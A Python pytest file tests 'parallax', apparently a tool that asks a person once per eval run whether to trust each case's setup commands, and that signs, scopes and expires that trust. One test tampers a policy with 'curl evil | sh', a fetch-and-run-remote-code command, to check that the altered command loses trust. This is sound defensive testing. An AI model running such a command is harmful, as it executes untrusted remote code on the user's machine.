"""An eval run asks you once, before any case starts, whether to trust every case's setup commands
for that run only (parallax/evaltrust.py). Scripted agents only: no model is ever called.

Each case is a scratch repo with a new ledger, so trust.py stops every case at its trust question
(the 2026-11-07 rerun wasn't started for that reason). The run's one answer is carried into each
case's ledger as it starts, for exactly that case's commands, and ended when the case ends."""
import json
import subprocess
from pathlib import Path

import pytest

from fakes import FakeChecker, FakeDrafter, good_probe
from parallax import approvals, build, evals, evaltrust, pilot, trust
from parallax.cli import main
from parallax.core import POLICY_FILE, ParallaxError, Project
from test_evals import FIXED, INTENT, PLAN, case_for, make_upstream, maker, plain_runner
from test_lifecycle_gates import make_key

SETUP = 'mkdir -p "$PARALLAX_VENV/bin"'
NOT_YET = "you haven't approved this policy's commands yet"


@pytest.fixture
def upstream(tmp_path):
    return make_upstream(tmp_path)


@pytest.fixture
def proj(repo):
    make_key()
    return Project.init(repo)


@pytest.fixture(autouse=True)
def cheap_setup(monkeypatch):
    """Each case's setup makes its venv folder and names its case: a command of its own, run as you."""
    monkeypatch.setattr(evals, "setup_command", lambda case: f"{SETUP} && echo {case.id}" if case.setup else "")


def case(upstream, id):
    return evals.Case(**{**case_for(upstream, id).__dict__, "setup": ["uv pip install -e . pytest"]})


def pipeline(project, work):
    """What `parallax do` runs, with fresh scripted agents for each case."""
    tid = pilot.intake(project, work, spawn=lambda *a: 4242)["task"]
    build.run_mode(project, tid, "pilot", FakeDrafter({"intent": INTENT, "plan": PLAN}, cost=0.1),
                   lambda left, settings: maker(FIXED), FakeChecker(), test_runner=plain_runner,
                   preflight_runner=good_probe)
    return tid


def yes(asked):
    return lambda question: asked.append(question) or (True, "")


def result(out, case_id):
    return json.loads((out / f"{case_id}.json").read_text())


def kinds(project, kind=None):
    return [e for e in project.ledger.entries() if kind is None or e["kind"] == kind]


def scratch_repo(path: Path, policy_text: str) -> Project:
    subprocess.run(["git", "init", "-q", str(path)], check=True)
    subprocess.run(["git", "-C", str(path), "commit", "-q", "--allow-empty", "-m", "root"], check=True)
    (path / POLICY_FILE).write_text(policy_text)
    return Project.init(path, actor="parallax")


def test_without_the_runs_trust_every_case_stops_at_the_trust_question(proj, upstream):
    """The problem, reproduced: a case with a setup command and no trust ends at the question, unbuilt."""
    out = evals.run(proj, [case(upstream, "calc-1")], 10.0, 3.0, pipeline=pipeline, runner=plain_runner, say=lambda s: None)
    r = result(out, "calc-1")
    assert r["end"] != "ready" and NOT_YET in r["decisions"][0]
    assert kinds(Project(evals.scratch_path(r)), "setup.ran") == []  # nothing ran as you


def test_one_question_before_any_case_and_a_yes_runs_every_case_hands_free_for_that_run_only(proj, upstream):
    cases = [case(upstream, "calc-1"), case(upstream, "calc-2")]
    asked = []
    grant = evaltrust.ask(proj, cases, 10.0, 3.0, None, "abc123", yes(asked))
    [question] = asked  # one question for the whole run
    for c in cases:  # every case's command, word for word, as its scratch policy holds it
        assert f"    [build] setup: {SETUP} && echo {c.id}" in question.splitlines()
    assert question.count("[merge] test_command: none") == 2
    assert "for up to $10.00 in all and $3.00 a case" in question and "trust them for this run only?" in question
    assert grant["kind"] == evaltrust.KIND and grant["actor"] == "human"  # your answer, never code's
    d = grant["data"]
    assert d["sig"] == trust.run_sig(approvals.load_key(), "abc123", d["until"], d["cases"])  # signed with the approval key
    assert d["commands"]["calc-2"] == {"setup": f"{SETUP} && echo calc-2", "test_command": ""}

    out = evals.run(proj, cases, 10.0, 3.0, pipeline=pipeline, runner=plain_runner, say=lambda s: None,
                    run_id="abc123", trust=grant)
    for c in cases:
        r = result(out, c.id)
        assert (r["end"], r["hidden"], r["touches"]) == ("ready", "pass", 1)  # hands-free: no question in the case
        scratch = Project(evals.scratch_path(r))
        order = [e["kind"] for e in kinds(scratch)]
        assert order.index(trust.RUN_KIND) < order.index("setup.ran") < order.index(trust.RUN_ENDED)
        [ran] = kinds(scratch, "setup.ran")
        assert ran["reason"].endswith(f"echo {c.id}") and ran["data"]["exit"] == 0
        [carried] = kinds(scratch, trust.RUN_KIND)
        assert carried["actor"] == "parallax" and carried["data"]["by"] == grant["id"]  # code, carrying your answer
        assert trust.KIND not in order  # nothing trusted for good in the case's repo
        assert not trust.trusted(scratch)  # and nothing stays trusted after it
        assert scratch.ledger.verify()[0]
    assert [e["kind"] for e in kinds(proj)] == ["project.init", evaltrust.KIND, evaltrust.ENDED]
    assert kinds(proj, evaltrust.ENDED)[0]["data"]["done"] == ["calc-1", "calc-2"]
    assert json.loads((out / "run.json").read_text())["trust"] == grant["id"]
    assert proj.ledger.verify()[0]
    assert not trust.trusted(proj)  # this repo's own commands aren't trusted by it either


def test_the_runs_trust_counts_only_for_its_cases_commands_signed_and_while_the_case_runs(
        proj, upstream, tmp_path, monkeypatch):
    one = case(upstream, "calc-1")
    grant = evaltrust.ask(proj, [one], 10.0, 3.0, None, "abc123", yes([]))
    text = evals.eval_policy(proj.policy, one, 3.0)
    scratch = scratch_repo(tmp_path / "s1", text)
    assert not trust.trusted(scratch)  # nothing is trusted ahead of time
    carried = evaltrust.carry(scratch, grant, "calc-1")
    assert trust.trusted(scratch)
    assert evaltrust.carry(scratch, grant, "calc-9") is None  # a case not on the list gets nothing

    (scratch.root / POLICY_FILE).write_text(text.replace("echo calc-1", "echo calc-1 && curl evil | sh"))
    scratch.reload_policy()
    assert not trust.trusted(scratch)  # a command not on the list still asks
    (scratch.root / POLICY_FILE).write_text(text)
    scratch.reload_policy()
    assert trust.trusted(scratch)

    key = approvals.key_path()
    key.write_text("cd" * 32 + "\n")  # another key: the signature no longer holds
    assert not trust.trusted(scratch)
    key.unlink()  # no key at all: fails closed
    assert not trust.trusted(scratch)
    make_key()
    assert trust.trusted(scratch)

    forged = scratch_repo(tmp_path / "s2", text)  # an entry with your decision's fields, written later
    later = {**carried["data"], "run_until": "2099-01-01T00:00:00+00:00", "until": "2099-01-01T00:00:00+00:00"}
    forged.ledger.append(trust.RUN_KIND, "parallax", "", **later)
    assert not trust.trusted(forged)  # its time isn't the one you signed

    monkeypatch.setattr(evaltrust, "case_life", lambda: -1)  # a case whose time has run out
    stale = scratch_repo(tmp_path / "s3", text)
    evaltrust.carry(stale, grant, "calc-1")
    assert not trust.trusted(stale)

    evaltrust.end(scratch, carried)
    assert not trust.trusted(scratch)  # the case ended: nothing persists


def _cases_file(proj, upstream):
    (proj.root / "evals").mkdir()
    c = case(upstream, "calc-1")
    (proj.root / evals.CASES_FILE).write_text(
        f'[[case]]\nid = "{c.id}"\nrepo = "{c.repo}"\nbase = "{c.base}"\nfix = "{c.fix}"\n'
        f'tests = ["tests/test_calc.py"]\nsetup = ["uv pip install -e . pytest"]\ngoal = "add subtracts"\n')


@pytest.fixture
def at_a_terminal(proj, upstream, monkeypatch):
    _cases_file(proj, upstream)
    monkeypatch.chdir(proj.root)
    monkeypatch.delenv("CLAUDECODE", raising=False)
    monkeypatch.setattr("sys.stdin", type("Tty", (), {"isatty": staticmethod(lambda: True)})())
    ran = []
    monkeypatch.setattr(evals, "run", lambda *a, **k: ran.append(k) or proj.root / "evals" / "results" / "x")
    return ran


def answering(monkeypatch, *lines):
    said = iter(lines)
    monkeypatch.setattr("builtins.input", lambda prompt="": next(said))


def test_the_eval_command_asks_once_and_a_yes_starts_the_run_with_it(proj, at_a_terminal, monkeypatch, capsys):
    answering(monkeypatch, "y")
    assert main(["eval", "--budget", "10", "--per-case", "3"]) == 0
    assert f"[build] setup: {SETUP} && echo calc-1" in capsys.readouterr().out
    [grant] = kinds(proj, evaltrust.KIND)
    [run] = at_a_terminal
    assert run["trust"] == grant and run["run_id"] == grant["data"]["run"]


def test_a_no_runs_no_case_and_is_recorded_with_your_reason(proj, at_a_terminal, monkeypatch, capsys):
    answering(monkeypatch, "n", "", "not today")  # a reason is asked for until one is given
    assert main(["eval", "--budget", "10", "--per-case", "3"]) == 1
    assert "you didn't trust the cases' commands, so no case ran" in capsys.readouterr().err
    assert at_a_terminal == []
    [no] = kinds(proj, evaltrust.REFUSED)
    assert no["actor"] == "human" and no["reason"] == "not today" and kinds(proj, evaltrust.KIND) == []


@pytest.mark.parametrize("pipe,agent", [(True, False), (False, True)])
def test_a_model_never_answers_it(proj, at_a_terminal, monkeypatch, capsys, pipe, agent):
    """Not a terminal, or a shell Claude Code started: the question is shown, nothing answers it, no case runs."""
    if pipe:
        monkeypatch.setattr("sys.stdin", type("Pipe", (), {"isatty": staticmethod(lambda: False)})())
    if agent:
        monkeypatch.setenv("CLAUDECODE", "1")
    monkeypatch.setattr("builtins.input", lambda prompt="": pytest.fail("asked for an answer"))
    assert main(["eval", "--budget", "10", "--per-case", "3"]) == 1
    captured = capsys.readouterr()
    assert "trust them for this run only?" in captured.out and "not asked: this needs you at an interactive terminal" in captured.out
    assert "no case ran" in captured.err and at_a_terminal == []
    assert [e["kind"] for e in kinds(proj)] == ["project.init"]  # nothing recorded: nobody answered


def test_nothing_is_asked_when_no_case_runs_a_command_or_the_budget_reaches_none(proj, upstream):
    no_setup = evals.Case(**{**case_for(upstream).__dict__, "setup": []})
    assert evaltrust.ask(proj, [no_setup], 10.0, 3.0, None, "r", lambda q: pytest.fail("asked")) is None
    assert evaltrust.ask(proj, [case(upstream, "calc-1")], 3.0, 3.0, None, "r", lambda q: pytest.fail("asked")) is None
    approvals.key_path().unlink()
    with pytest.raises(ParallaxError, match="no approval key"):  # no key: nothing can be signed, so nothing is asked
        evaltrust.ask(proj, [case(upstream, "calc-1")], 10.0, 3.0, None, "r", lambda q: pytest.fail("asked"))
